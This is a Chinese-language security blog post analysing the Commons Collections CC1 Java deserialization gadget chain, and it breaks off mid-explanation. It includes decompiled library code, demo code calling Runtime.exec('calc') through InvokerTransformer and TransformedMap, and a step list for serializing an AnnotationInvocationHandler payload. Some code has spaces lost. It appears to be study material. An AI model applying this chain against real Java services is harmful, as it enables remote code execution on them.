---
title: 【java安全】CC1链分析
url: https://mp.weixin.qq.com/s/SrgjKqKUUEQhtM2BpN5saw
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:25:32.072170
---

# 【java安全】CC1链分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/QT8iaU7O4fGP8Bfl09RGVNnEN625zktpE0SajqqtjFnTX9dSIrf7ADKM5ZpjHaf5UJtZAVa1Fsxdvy7ZCoOYdzEgoPqRoEYbQib09YFBBA1EY/0?wx_fmt=jpeg)

# 【java安全】CC1链分析

原创

仰恩网安校队
仰恩网安校队

GET不到的FLAG

![]()

在小说阅读器中沉浸阅读

CC1链分析

先找到这个类

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGM4icgbqPnZ0nODUV9Xm4eVTRZ9e7RmtrkNeEbhGJtr8nyyKTceHsaBnUoKqsScntcM2hzkDZrtbvkMHO7hH7ptELCicKNCugT6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGMo766S1D9vj6f3YRT7EjIs0CZ0c7lHNv5zeIw1xG712fnxNzNL8Ir0Zb7ZuicMzupCESRZahWOcCIRf2NeS7xQYR2Qv2kYDGvU/640?wx_fmt=png)

寻找哪个类去实现了

是在这个类实现的

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGNZtSQl3pD9sVLgR3yPgJzUM1IYLzHAM9wicV251NXRqQuoHVgZHAIicmkxQ4QyaPW1mnWhmxwQq9xnwficKHAiaNQEqWobhaoWbqw/640?wx_fmt=png)

publicObjecttransform(Object input) {
    // 1. 处理空值
    if (input == null) {
        returnnull;  // 如果输入为null，直接返回null
    } else {
        try {
            // 2. 获取输入对象的Class对象
            Class cls = input.getClass();

            // 3. 通过反射获取指定的方法
            //    iMethodName: 要调用的方法名（由构造函数传入）
            //    iParamTypes: 方法参数类型数组（由构造函数传入）
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);

            // 4. 调用方法并返回结果
            //    input: 调用方法的对象（即输入对象本身）
            //    iArgs: 方法参数值数组（由构造函数传入）
            return method.invoke(input, this.iArgs);

        } catch (NoSuchMethodException var4) {
            // 5. 异常处理：方法不存在
            thrownewFunctorException("InvokerTransformer: The method '" + this.iMethodName +
                                      "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            // 6. 异常处理：无权访问方法（如private方法）
            thrownewFunctorException("InvokerTransformer: The method '" + this.iMethodName +
                                      "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            // 7. 异常处理：被调用的方法内部抛出异常
            InvocationTargetException ex = var6;
            thrownewFunctorException("InvokerTransformer: The method '" + this.iMethodName +
                                      "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
}

transform的两个参数会传入到上面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGMB1qIb4eVfMEjvOd25slsNtEplCF4UHxWyfS8ub2Um4iaPYibJaD2cHa5IA6ibU3Lxd2BZ1GogfICp5g9SibNibe4ib0icA7wRuBia4Vs/640?wx_fmt=png)

所以我们new InvokerTransformer这个类的时候传入的是就是transform的iMethodName和iParamTypes，同时InvokerTransformer这个类接收的参数类型为String、Class、Object。

我们来创建一个实例代码：

import org.apache.commons.collections.functors.InvokerTransformer;

publicclass TestCC1 {
    publicstaticvoidmain(String[] args) {
        Runtime runtime= Runtime.getRuntime();
        //runtime.exec()
        InvokerTransformer exec = newInvokerTransformer("exec",newClass[]{String.class},newObject[]{"calc"});
        exec.transform(runtime);
    }
}

1. 创建 InvokerTransformer 对象
   ↓
2. 保存方法信息："exec", [String.class], ["calc"]
   ↓
3. 调用 transform(runtime)
   ↓
4. 反射获取 runtime 的 exec 方法
   ↓
5. 执行 runtime.exec("calc")
   ↓
6. 打开计算器程序

走到这里我们就会发现想要打通链子我们需要触发InvokerTransformer类的transform方法，还需要transform方法的参数可控，此时我们的思路就要寻找哪里调用了transform方法。

在这里idea不好使，我们拖到jadx反编译一下

通过搜索得知cc链是是在这里被调用的

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGNtI3tQia0GIvMWiaSB9ots5y5JDcH4bzd1jZHz6nMibJNM98fkWGgHyNwSVmVia9qtVWRkc9f6X4vErkUewd9LjgfQwYn7CliaAJmA/640?wx_fmt=png)

这里有个问题，我们要确认vauleTransformer调用的transform方法是InvokerTransformer这个类的方法。

到这里我们就看看vauleTransformer是怎么调用transform方法的

可以看到在这个位置

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGP0wFQsKHnd9u2gxdekmTfiajicPDicicW1wgMa6SHCUFr3WXK1lEicfiac9SKmPwVIFdAz6Qe5z9P3rtrltHKhy0gQxmpN1Dc9Vk57M/640?wx_fmt=png)

在这里我们就知道了，要让 valueTransformer 等于 InvokerTransformer 的对象或者说要让 valueTransformer 指向InvokerTransformer 类的实例

因为有保护属性，所以我们看一下哪里调用了这个构造方法

我们搜索了一下发现这里被调用了，所以我们选择用这个去调用地下的构造函数TransformedMap，然后再一直被调用就可以走回我们前面的源码例子。

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGMulJpvpO36HQeWK4T6lSDrhEyG1Ff8QVgZbOy60MOp3TLU3VCtKgyn5krxNqtiaic3O2ic5JwAhyfHYCzvbWVSzuypfEFMXyjiadg/640?wx_fmt=png)

接下来，我们也要看哪里调用了checkSetValue方法，最后发现在AbstractInputCheckedMapDecorator这个类中进行了调用

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGPodPSibXZfw6A25Jh1DXzABSEKvHDHJX8NVwWZDWB3v4CwAtqaUCA7SAcAjdVkZtD9h3FtjInIAklzricwChl13noG1ic49A3l3s/640?wx_fmt=png)

这个时候我已经有点懵了，借助ai的理论梳理一下整体剧情

CC1 链（以 AnnotationInvocationHandler 为例）的经典利用步骤：

构造一个 Transformer 链，比如 ConstantTransformer + InvokerTransformer，最终能执行 Runtime.exec("calc")。

把这个 Transformer 链作为 valueTransformer 传入 TransformedMap.decorate()，得到一个装饰后的 Map。

创建一个 AnnotationInvocationHandler 对象，并将这个 TransformedMap 作为其成员变量 memberValues 传入（通过反射）。

序列化这个 AnnotationInvocationHandler。

反序列化时，AnnotationInvocationHandler.readObject() 会遍历 memberValues 的 entrySet，并对每个 entry 调用 setValue 方法（目的是设置注解的默认值）。

当调用到 MapEntry.setValue 时，代码中的 parent.checkSetValue(value) 就会被执行，进而触发我们精心构造的 Transformer 链，最终弹出计算器。

为什么要用 AbstractInputCheckedMapDecorator 类型？
parent 的类型是 AbstractInputCheckedMapDecorator，这是 TransformedMap 的父类，它声明了 checkSetValue 抽象方法。TransformedMap 实现了这个方法，内部调用 valueTransformer.transform(value)。这样设计使得 MapEntry 不直接依赖 TransformedMap 的具体实现，而是依赖其父类，更通用。

继续创建我们的TestCC1，梳理一下逻辑

// 1. 获取 Runtime 对象
Runtime runtime = Runtime.getRuntime();

// 2. 创建 InvokerTransformer，用于调用对象的 "exec" 方法
InvokerTransformer exec = newInvokerTransformer(
    "exec",
    newClass[]{String.class},
    newObject[]{"calc"}
);

// 3. 直接触发转换（反射调用 runtime.exec("calc")）
exec.transform(runtime);          // 第一次弹出计算器

// 4. 创建一个普通 HashMap，放入一个键值对
HashMap<Object,Object> map = newHashMap<>();
map.put("key","value");

// 5. 用 TransformedMap 装饰该 HashMap，设置 valueTransformer 为 exec
Map<Object,Object> decorated = TransformedMap.decorate(map, null, exec);

// 6. 遍历装饰后 Map 的 entrySet
for(Map.Entry abc : decorated.entrySet()) {
    // 对每个 entry 调用 setValue，传入 runtime 对象
    abc.setValue(runtime);        // 第二次弹出计算器
}

同时我们在上面的代码可以看到，是setValue导致了弹出计算器，于是现在我们找哪里调用了setValue，不过在这里我们用jadx没有搜到，我们就直接根据资料知道其实是在AnnotationInvocationHandler这个类中进行了调用

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGOhZibticPYojgr7lHHNPgnEbib99eic7s5nU5iaXnJ8A8oYnR1UTyiat3ibhYWnZicrdgzxhx6xicFYAHUiaXI8yJAgouDCDErfEvL897Mw/640?wx_fmt=png)

在这里，我们要探索如何确定var5是AbstractInputCheckedMapDecorator.的对象，否则无法调用，于是我们开始寻找var5是从哪里来的

privatevoidreadObject(ObjectInputStream var1) throwsIOException, ClassNotFoundException {
    var1.defaultReadObject();                     // (1) 从流中恢复对象字段
    AnnotationType var2 = null;
    try {
        var2 = AnnotationType.getInstance(this.type); // (2) 获取注解类型元数据
    } catch (IllegalArgumentException var9) {
        thrownewInvalidObjectException("...");
    }
    Map var3 = var2.memberTypes();                 // (3) 获取注解方法的期望类型映射
    Iterator var4 = this.memberValues.entrySet().iterator(); // (4) 获取 memberValues 的 entry 迭代器
    while(var4.hasNext()) {
        Map.Entry var5 = (Map.Entry)var4.next();   // (5) 每个 entry
        String var6 = (String)var5.getKey();       // (6) 键 = 注解方法名
        Class var7 = (Class)var3.get(var6);        // (7) 从 var3 中获取该方法期望的返回类型
        if (var7 != null) {                         // (8) 如果方法存在
            Object var8 = var5.getValue();          // (9) 当前存储的值
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                // (10) 类型不匹配，构造异常代理并 setValue
                var5.setValue( ... );
            }
        }
    }
}

var1 是 readObject 的参数 ObjectInputStream，它的作用是从序列化流中读取对象的状态。要让 var5 存在并被迭代，必须满足：

memberValues 在反序列化后是一个非空的 Map，这样才能从 entrySet() 中获取到条目。

这要求我们在序列化之前，向 memberValues 中放入至少一个键值对（key 通常设置为注解的方法名，如 "value"）。

并且 memberValues 本身必须实现了 Serializable（TransformedMap 是可序列化的），以便能被 var1.defaultReadObject() 正确恢复。

具体来说，在 CC1 利用链中：

攻击者构造一个 TransformedMap，将其作为 memberValues。

向这个 Map 中放入一个条目，例如 { "value": "xxx" }。

创建 AnnotationInvocationHandler 对象，将这个 Map 传入构造函数。

序列化该 AnnotationInvocationHandler 对象。

当目标反序列化时，var1.defaultReadObject() 恢复出 memberValues（即那个 TransformedMap），其中包含我们放入的条目。

随后循环...